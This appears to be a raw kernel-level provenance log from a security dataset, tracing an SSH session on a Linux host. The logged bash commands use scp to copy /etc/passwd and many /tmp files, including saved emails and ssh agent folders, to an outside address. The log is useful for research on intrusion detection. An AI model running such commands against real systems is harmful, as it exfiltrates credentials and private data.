1557791947.517:1311359962,46462F3D-16D4-43CB-6C84-4E0DE36E4D45:run-parts,EXECUTE,B7B8C114-C9E9-08BF-1CC3-080E0194FDF9,50-landscape-sy,null
1557791947.517:1311359958,05F46731-E42A-2956-AEE0-33D9B1AFE084:run-parts,FORK,46462F3D-16D4-43CB-6C84-4E0DE36E4D45,run-parts,null
1557791947.509:1311359609,B9A30243-B44C-C2F3-66D0-6EF21A2B0FDA:env,EXECUTE,05F46731-E42A-2956-AEE0-33D9B1AFE084,run-parts,null
1557791947.509:1311359573,24424FB2-E0D9-CCE4-9AEC-0C8F3E6A26E3:sh,EXECUTE,B9A30243-B44C-C2F3-66D0-6EF21A2B0FDA,env,null
1557791947.509:1311359566,318702F9-0C75-9CCC-4226-2ADCDE5C6E64:sh,FORK,24424FB2-E0D9-CCE4-9AEC-0C8F3E6A26E3,sh,null
1557791947.509:1311359521,4AB93127-CFD9-7463-F3F7-DA1D5E3F5BE6:sshd,EXECUTE,318702F9-0C75-9CCC-4226-2ADCDE5C6E64,sh,null
1557791947.509:1311359507,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,FORK,4AB93127-CFD9-7463-F3F7-DA1D5E3F5BE6,sshd,null
1557791947.509:1311359499,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.481:1311359315,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.481:1311359264,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.481:1311359252,0EC8E810-7242-D544-191A-B929BD7322C9:sshd,CHANGE_PRINCIPAL,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5,sshd,null
1557791947.481:1311359251,83ABC962-C350-B041-9298-1F13B0999A62:sshd,CHANGE_PRINCIPAL,0EC8E810-7242-D544-191A-B929BD7322C9,sshd,null
1557791947.481:1311359250,0EC8E810-7242-D544-191A-B929BD7322C9:sshd,CHANGE_PRINCIPAL,83ABC962-C350-B041-9298-1F13B0999A62,sshd,null
1557791947.481:1311359249,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,CHANGE_PRINCIPAL,0EC8E810-7242-D544-191A-B929BD7322C9,sshd,null
1557791947.481:1311359247,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.481:1311359233,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.477:1311359193,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557791947.477:1311359190,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.461:1311359165,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557791947.461:1311359162,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.357:1311358939,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.357:1311358907,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557791947.357:1311358906,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557791947.265:1311358692,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791947.261:1311358436,CBCDFF0D-B41A-4FFA-77B6-96DBE0DCA5AD:sshd,EXECUTE,A0EC290A-7F1C-06D5-3886-E86DF5A7FAE5,sshd,null
1557791947.257:1311358415,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,CBCDFF0D-B41A-4FFA-77B6-96DBE0DCA5AD,sshd,null
1557791938.105:1311351223,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791938.101:1311351133,89F67490-941D-4E1B-D44C-89240B8724CD:sshd,CHANGE_PRINCIPAL,113C3F9F-2254-4558-AA67-903C9ECE3941,sshd,null
1557791938.101:1311351132,89F67490-941D-4E1B-D44C-89240B8724CD:sshd,CHANGE_PRINCIPAL,89F67490-941D-4E1B-D44C-89240B8724CD,sshd,null
1557791938.101:1311351130,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,CHANGE_PRINCIPAL,89F67490-941D-4E1B-D44C-89240B8724CD,sshd,null
1557791938.101:1311351073,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.541:1311345131,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345128,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345125,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345122,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345119,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345116,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345113,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.537:1311345091,9696CE26-3D2E-E632-8FE8-5B5090BA81CF:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.533:1311344996,2815BC6A-FE71-8297-5ED7-48433231B7D3:scp,EXECUTE,9696CE26-3D2E-E632-8FE8-5B5090BA81CF,ssh,null
1557791935.533:1311344987,BC1CCB78-4D4C-1926-2ACA-3932B3EBC389:scp,FORK,2815BC6A-FE71-8297-5ED7-48433231B7D3,scp,null
1557791935.533:1311344980,BC1CCB78-4D4C-1926-2ACA-3932B3EBC389:scp,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791935.529:1311344919,4A2A2030-0026-4D6C-183C-C33197411FD2:bash,EXECUTE,BC1CCB78-4D4C-1926-2ACA-3932B3EBC389,b'scp -r /tmp/arthrosporic /tmp/athleticism /tmp/cerebroganglion /tmp/dyking /tmp/filosus /tmp/firefox_admin /tmp/glassite /tmp/grains /tmp/have /tmp/hsperfdata_darpa /tmp/hydrocharitaceous /tmp/intermelt /tmp/kowtowing /tmp/less /tmp/limpiness /tmp/loverless /tmp/mampus /tmp/mnemonics /tmp/mozilla_admin0 /tmp/natally /tmp/nscopy.tmp /tmp/nsemail-100.eml /tmp/nsemail-101.eml /tmp/nsemail-102.eml /tmp/nsemail-103.eml /tmp/nsemail-104.eml /tmp/nsemail-105.eml /tmp/nsemail-10.eml /tmp/nsemail-11.eml /tmp/nsemail-12.eml /tmp/nsemail-13.eml /tmp/nsemail-14.eml /tmp/nsemail-15.eml /tmp/nsemail-16.eml /tmp/nsemail-17.eml /tmp/nsemail-18.eml /tmp/nsemail-19.eml /tmp/nsemail-1.eml /tmp/nsemail-20.eml /tmp/nsemail-21.eml /tmp/nsemail-22.eml /tmp/nsemail-23.eml /tmp/nsemail-24.eml /tmp/nsemail-25.eml /tmp/nsemail-26.eml /tmp/nsemail-27.eml /tmp/nsemail-28.eml /tmp/nsemail-29.eml /tmp/nsemail-2.eml /tmp/nsemail-30.eml /tmp/nsemail-31.eml /tmp/nsemail-32.eml /tmp/nsemail-33.eml /tmp/nsemail-34.eml /tmp/nsemail-35.eml /tmp/nsemail-36.eml /tmp/nsemail-37.eml /tmp/nsemail-38.eml /tmp/nsemail-39.eml /tmp/nsemail-3.eml /tmp/nsemail-40.eml /tmp/nsemail-41.eml /tmp/nsemail-42.eml /tmp/nsemail-43.eml /tmp/nsemail-44.eml /tmp/nsemail-45.eml /tmp/nsemail-46.eml /tmp/nsemail-47.eml /tmp/nsemail-48.eml /tmp/nsemail-49.eml /tmp/nsemail-4.eml /tmp/nsemail-50.eml /tmp/nsemail-51.eml /tmp/nsemail-52.eml /tmp/nsemail-53.eml /tmp/nsemail-54.eml /tmp/nsemail-55.eml /tmp/nsemail-56.eml /tmp/nsemail-57.eml /tmp/nsemail-58.eml /tmp/nsemail-59.eml /tmp/nsemail-5.eml /tmp/nsemail-60.eml /tmp/nsemail-61.eml /tmp/nsemail-62.eml /tmp/nsemail-63.eml /tmp/nsemail-64.eml /tmp/nsemail-65.eml /tmp/nsemail-66.eml /tmp/nsemail-67.eml /tmp/nsemail-68.eml /tmp/nsemail-69.eml /tmp/nsemail-6.eml /tmp/nsemail-70.eml /tmp/nsemail-71.eml /tmp/nsemail-72.eml /tmp/nsemail-73.eml /tmp/nsemail-74.eml /tmp/nsemail-75.eml /tmp/nsemail-76.eml /tmp/nsemail-77.eml /tmp/nsemail-78.eml /tmp/nsemail-79.eml /tmp/nsemail-7.eml /tmp/nsemail-80.eml /tmp/nsemail-81.eml /tmp/nsemail-82.eml /tmp/nsemail-83.eml /tmp/nsemail-84.eml /tmp/nsemail-85.eml /tmp/nsemail-86.eml /tmp/nsemail-87.eml /tmp/nsemail-88.eml /tmp/nsemail-89.eml /tmp/nsemail-8.eml /tmp/nsemail-90.eml /tmp/nsemail-91.eml /tmp/nsemail-92.eml /tmp/nsemail-93.eml /tmp/nsemail-94.eml /tmp/nsemail-95.eml /tmp/nsemail-96.eml /tmp/nsemail-97.eml /tmp/nsemail-98.eml /tmp/nsemail-99.eml /tmp/nsemail-9.eml /tmp/nsemail.eml /tmp/nsemail.html /tmp/nsmail.tmp /tmp/overmeticulousness /tmp/promethazine /tmp/sabbathless /tmp/sclerophyll /tmp/ssh-fN7CqnTAo346 /tmp/ssh-xR9xVWh22iC3 /tmp/subaggregation /tmp/thakur /tmp/transmarginal /tmp/tristichous /tmp/uncipher /tmp/undunged /tmp/unengraven /tmp/unfrugality /tmp/uninflicted /tmp/urgentness admin@128.55.12.124:.',null
1557791935.529:1311344913,73F9BA22-64AA-E39D-B4AC-3ABD134B8369:bash,FORK,4A2A2030-0026-4D6C-183C-C33197411FD2,bash,null
1557791934.413:1311342759,D8474B6A-91A6-DD6B-7441-ED6A50889648:scp,READ,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342038,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342035,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342032,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342029,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342026,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342023,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311342020,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311341998,FA2C9710-D296-EEC5-6E27-BDA02181F7B2:ssh,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.601:1311341903,25812E1C-D78E-2DA4-6059-DF5C7751F5F8:scp,EXECUTE,FA2C9710-D296-EEC5-6E27-BDA02181F7B2,ssh,null
1557791933.601:1311341894,D8474B6A-91A6-DD6B-7441-ED6A50889648:scp,FORK,25812E1C-D78E-2DA4-6059-DF5C7751F5F8,scp,null
1557791933.601:1311341887,D8474B6A-91A6-DD6B-7441-ED6A50889648:scp,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.597:1311341826,9F95C7E4-8CE7-60E0-3428-D34595288C6D:bash,EXECUTE,D8474B6A-91A6-DD6B-7441-ED6A50889648,b'scp -r /etc/passwd admin@128.55.12.124:\\C:WindowsTemp',null
1557791933.597:1311341820,73F9BA22-64AA-E39D-B4AC-3ABD134B8369:bash,FORK,9F95C7E4-8CE7-60E0-3428-D34595288C6D,bash,null
1557791933.417:1311338964,73F9BA22-64AA-E39D-B4AC-3ABD134B8369:bash,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.413:1311338878,78DD2BF9-99E1-AFBD-DBC5-22956C7C2C61:sshd,EXECUTE,73F9BA22-64AA-E39D-B4AC-3ABD134B8369,bash,null
1557791933.413:1311338755,82F2BE00-931D-4BCB-B4D4-C76628FD8D69:sshd,FORK,78DD2BF9-99E1-AFBD-DBC5-22956C7C2C61,sshd,null
1557791933.413:1311338708,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.413:1311338702,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.413:1311338682,068592F3-42B8-1736-978A-04BF92FF3FD7:sshd,CHANGE_PRINCIPAL,82F2BE00-931D-4BCB-B4D4-C76628FD8D69,sshd,null
1557791933.413:1311338660,8F409E44-78E7-23C2-A617-CACC79843AF2:sshd,CHANGE_PRINCIPAL,068592F3-42B8-1736-978A-04BF92FF3FD7,sshd,null
1557791933.409:1311338657,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,FORK,8F409E44-78E7-23C2-A617-CACC79843AF2,sshd,null
1557791933.409:1311338648,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.409:1311338612,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.409:1311338609,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.409:1311338606,113C3F9F-2254-4558-AA67-903C9ECE3941:sshd,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
1557791933.361:1311336536,CFB78B44-EA90-6830-A94A-EF360BD7000B:lsb_release,MMAP,655A6FC0-89F7-9014-CBC1-D7D0A0D19042,/etc/passwd,null
